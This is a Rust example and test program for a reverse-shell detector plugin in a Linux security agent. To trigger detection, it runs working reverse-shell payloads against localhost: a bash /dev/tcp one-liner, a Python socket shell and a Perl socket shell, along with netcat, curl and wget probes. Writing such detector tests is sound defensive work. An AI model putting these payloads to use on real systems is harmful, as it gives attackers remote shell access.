use std::time::Duration;
use tokio::time::sleep;
use linux_agent::plugins::reverse_shell::ReverseShellDetector;
use std::process::Command;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 로깅 초기화
    env_logger::init();
    
    println!("=== Reverse Shell Plugin Test Example ===");
    println!("Testing reverse_shell.rs plugin functionality");
    
    // 탐지기 생성
    let detector = ReverseShellDetector::new();
    
    // 탐지기 시작
    println!("Starting reverse shell detector plugin...");
    detector.start().await?;
    
    println!("Plugin started successfully!");
    println!("Waiting for initialization...");
    sleep(Duration::from_secs(10)).await;
    
    // 플러그인 기능별 테스트
    println!("\n=== Testing Plugin Features ===");
    
    // 테스트 1: 의심스러운 포트 연결 (reverse_shell.rs의 주요 탐지 기능)
    println!("Test 1: Suspicious port connections");
    test_suspicious_ports().await?;
    
    // 테스트 2: 리버스 쉘 패턴
    println!("Test 2: Reverse shell patterns");
    test_reverse_shell_patterns().await?;
    
    // 테스트 3: 외부 연결
    println!("Test 3: External connections");
    test_external_connections().await?;
    
    // 테스트 4: 의심스러운 프로세스
    println!("Test 4: Suspicious processes");
    test_suspicious_processes().await?;
    
    // 결과 확인
    println!("\n=== Checking Plugin Detection Results ===");
    sleep(Duration::from_secs(15)).await;
    
    let events = detector.get_detected_events();
    let connections = detector.get_suspicious_connections();
    
    println!("Total events detected: {}", events.len());
    println!("Suspicious connections: {}", connections.len());
    
    // 이벤트 타입별 분석
    analyze_events_by_type(&events);
    
    // 연결 정보 분석
    analyze_connections(&connections);
    
    // 최종 리포트 생성
    println!("\n=== Final Plugin Report ===");
    let report = detector.generate_report();
    println!("{}", report);
    
    println!("\nPlugin test completed!");
    Ok(())
}

/// 의심스러운 포트 연결 테스트
async fn test_suspicious_ports() -> Result<(), Box<dyn std::error::Error>> {
    let suspicious_ports = vec![4444, 1337, 31337, 9001, 9002, 6667, 6668, 6669];
    
    for port in suspicious_ports {
        println!("  Testing port {}...", port);
        let _result = Command::new("nc")
            .args(&["-v", "127.0.0.1", &port.to_string()])
            .output();
        
        sleep(Duration::from_millis(500)).await;
    }
    
    println!("  ✓ Suspicious port tests completed");
    Ok(())
}

/// 리버스 쉘 패턴 테스트
async fn test_reverse_shell_patterns() -> Result<(), Box<dyn std::error::Error>> {
    // Netcat 리버스 쉘
    println!("  Testing netcat reverse shell...");
    let _result = Command::new("bash")
        .args(&["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"])
        .output();
    
    sleep(Duration::from_secs(2)).await;
    
    // Python 리버스 쉘
    println!("  Testing Python reverse shell...");
    let python_code = r#"
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"#;
    
    let _result = Command::new("python3")
        .args(&["-c", python_code])
        .output();
    
    sleep(Duration::from_secs(2)).await;
    
    // Perl 리버스 쉘
    println!("  Testing Perl reverse shell...");
    let _result = Command::new("perl")
        .args(&["-e", "use Socket;$i=\"127.0.0.1\";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"])
        .output();
    
    sleep(Duration::from_secs(2)).await;
    
    println!("  ✓ Reverse shell pattern tests completed");
    Ok(())
}

/// 외부 연결 테스트
async fn test_external_connections() -> Result<(), Box<dyn std::error::Error>> {
    let external_ips = vec!["8.8.8.8", "1.1.1.1", "208.67.222.222"];
    
    for ip in external_ips {
        println!("  Testing external connection to {}...", ip);
        let _result = Command::new("curl")
            .args(&["-s", "--connect-timeout", "3", &format!("http://{}", ip)])
            .output();
        
        sleep(Duration::from_millis(500)).await;
    }
    
    println!("  ✓ External connection tests completed");
    Ok(())
}

/// 의심스러운 프로세스 테스트
async fn test_suspicious_processes() -> Result<(), Box<dyn std::error::Error>> {
    // netcat 실행
    println!("  Testing netcat process...");
    let _result = Command::new("nc")
        .args(&["-l", "-p", "8080"])
        .spawn();
    
    sleep(Duration::from_secs(1)).await;
    
    // wget 실행
    println!("  Testing wget process...");
    let _result = Command::new("wget")
        .args(&["--timeout=2", "http://127.0.0.1:8080", "-O", "/dev/null"])
        .output();
    
    sleep(Duration::from_secs(1)).await;
    
    // curl 실행
    println!("  Testing curl process...");
    let _result = Command::new("curl")
        .args(&["--connect-timeout", "2", "http://127.0.0.1:8080"])
        .output();
    
    sleep(Duration::from_secs(1)).await;
    
    println!("  ✓ Suspicious process tests completed");
    Ok(())
}

/// 이벤트 타입별 분석
fn analyze_events_by_type(events: &[linux_agent::plugins::reverse_shell::ReverseShellEvent]) {
    use linux_agent::plugins::reverse_shell::EventType;
    
    let mut event_counts = std::collections::HashMap::new();
    
    for event in events {
        let count = event_counts.entry(&event.event_type).or_insert(0);
        *count += 1;
    }
    
    println!("\nEvent type analysis:");
    for (event_type, count) in event_counts {
        println!("  {:?}: {} events", event_type, count);
    }
}

/// 연결 정보 분석
fn analyze_connections(connections: &[linux_agent::plugins::reverse_shell::ConnectionInfo]) {
    if connections.is_empty() {
        println!("\nNo suspicious connections detected");
        return;
    }
    
    println!("\nSuspicious connection analysis:");
    
    // 포트별 분석
    let mut port_counts = std::collections::HashMap::new();
    for conn in connections {
        let count = port_counts.entry(conn.remote_port).or_insert(0);
        *count += 1;
    }
    
    println!("  Port analysis:");
    for (port, count) in port_counts {
        println!("    Port {}: {} connections", port, count);
    }
    
    // 프로세스별 분석
    let mut process_counts = std::collections::HashMap::new();
    for conn in connections {
        let count = process_counts.entry(&conn.process_name).or_insert(0);
        *count += 1;
    }
    
    println!("  Process analysis:");
    for (process, count) in process_counts {
        println!("    {}: {} connections", process, count);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_plugin_creation() {
        let detector = ReverseShellDetector::new();
        assert!(detector.get_detected_events().is_empty());
        assert!(detector.get_suspicious_connections().is_empty());
    }
    
    #[tokio::test]
    async fn test_plugin_start() {
        let detector = ReverseShellDetector::new();
        let result = detector.start().await;
        assert!(result.is_ok());
    }
    
    #[test]
    fn test_suspicious_port_detection() {
        // reverse_shell.rs의 is_suspicious_connection_pattern 함수 테스트
        use linux_agent::plugins::reverse_shell::{ConnectionInfo, ReverseShellDetector};
        use std::time::Instant;
        
        let conn = ConnectionInfo {
            local_addr: 0,
            remote_addr: 0,
            local_port: 0,
            remote_port: 4444, // 의심스러운 포트
            pid: 0,
            process_name: "test".to_string(),
            first_seen: Instant::now(),
            last_seen: Instant::now(),
            connection_count: 1,
            is_suspicious: false,
        };
        
        assert!(ReverseShellDetector::is_suspicious_connection_pattern(&conn));
    }
}
